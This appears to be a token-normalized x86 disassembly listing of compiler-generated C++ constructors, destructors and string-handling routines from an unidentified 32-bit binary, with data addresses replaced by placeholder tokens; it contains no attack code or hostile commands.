mov [ esi + 0x8 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001d4a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f2e7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x24 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x34 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x3c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x28 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x40 ] r--data
mov [ esi + 0x48 ] r--data
mov [ esi + 0x34 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x3c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x5
push [ ebp + 0xc ]
lea ecx [ esi + 0x48 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x1c ]
mov [ esi + 0x28 ] eax
mov eax [ ebp + 0x20 ]
mov [ esi + 0x2c ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x24 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x3c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x3c ] 0x7
mov [ ebp + 0x28 ] ax
mov eax esi
mov [ ebp + 0x38 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x38
push [ ebp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001d610
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f31b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x34 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x34 ] r--data
mov eax [ esi - 0x34 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x34 ] r--data
mov eax [ esi - 0x34 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x34 ]
mov [ ecx + esi - 0x38 ] eax
mov eax [ esi - 0x34 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x3c ]
mov [ ecx + esi - 0x38 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x1c ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0x1c ] 0x7
mov [ esi - 0x20 ] 0x0
mov [ esi - 0x30 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001d6b0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x34 ]
mov ecx esi
call sub_1001d6e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001d6e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x34 ]
call sub_1001d610
mov eax [ esi + 0x48 ]
lea edx [ esi + 0x64 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x40 ]
mov [ esi + 0x3c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x40 ] r--data
mov [ esi + 0x34 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001d7a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f383
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x1c ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x24 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0x13
push [ ebp + 0xc ]
mov ecx esi
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1001d880
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f3b3
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x10 ] edx
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1001d950
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x1c ]
lea ecx [ edi + 0x1c ]
call sub_1001d880
test [ ebp + 0x8 ] 0x1
mov ecx [ edi + 0x28 ]
mov [ edi + 0x24 ] r--data
mov ecx [ ecx + 0x4 ]
mov [ ecx + edi + 0x28 ] r--data
mov [ edi + 0x1c ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001d9a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f1f7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x28 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x14 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x2c ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x20 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x28 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0xc
push [ ebp + 0xc ]
lea ecx [ esi + 0x30 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x28 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x28 ] 0x7
mov [ ebp + 0x14 ] ax
mov eax esi
mov [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x24
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001daf0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f22b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x20 ] r--data
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x20 ]
mov [ ecx + esi - 0x24 ] eax
mov eax [ esi - 0x20 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x28 ]
mov [ ecx + esi - 0x24 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0x8 ] 0x7
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001db90
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x20 ]
mov ecx esi
call sub_1001dbc0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001dbc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x20 ]
call sub_1001daf0
mov eax [ esi + 0x30 ]
lea edx [ esi + 0x4c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x2c ]
mov [ esi + 0x28 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] r--data
mov [ esi + 0x20 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001dc80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f437
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x8 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0xd
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001ddd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f22b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi - 0x20 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x8
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi - 0x20 ] 0x0
xor eax eax
mov [ esi - 0x8 ] 0x7
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001de90
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_1001dec0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001dec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_1001ddd0
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001df80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f4da
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x38 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x40 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x1c ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] eax
mov [ edi ] al
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp + 0x14 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x44 ] r--data
mov [ esi + 0x48 ] r--data
mov [ esi + 0x38 ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x40 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x4
push ecx
push 0xb
push [ ebp + 0xc ]
lea ecx [ esi + 0x48 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x10 ] 0x7
lea eax [ ebp + 0x2c ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x28 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_100018b0
xor eax eax
mov [ ebp + 0x28 ] 0x7
mov [ ebp + 0x24 ] 0x0
mov [ ebp + 0x14 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x40 ] 0x10
jb r-xdata
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x40 ] 0xf
mov eax esi
mov [ ebp + 0x3c ] 0x0
mov [ ebp + 0x2c ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x3c
push [ ebp + 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e120
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f516
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x38 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x38 ] r--data
mov eax [ esi - 0x38 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x38 ] r--data
mov eax [ esi - 0x38 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x38 ]
mov [ ecx + esi - 0x3c ] eax
mov eax [ esi - 0x38 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x40 ]
mov [ ecx + esi - 0x3c ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x20 ] 0x8
jb r-xdata
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi - 0x20 ] 0x7
mov [ esi - 0x24 ] 0x0
mov [ esi - 0x34 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e1f0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x38 ]
mov ecx esi
call sub_1001e220
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e220
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x38 ]
call sub_1001e120
mov eax [ esi + 0x48 ]
lea edx [ esi + 0x64 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x44 ]
mov [ esi + 0x40 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x44 ] r--data
mov [ esi + 0x38 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001e2e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f596
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push ecx
push 0x14
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x34 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x3c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x18 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x14 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x40 ] r--data
mov [ esi + 0x34 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x3c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x10 ] 0x3
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x28 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x28 ] 0x7
mov [ ebp + 0x14 ] ax
mov eax esi
mov [ ebp + 0x24 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x24
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e420
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f5e1
mov eax [ fs : 0x0 ]
push eax
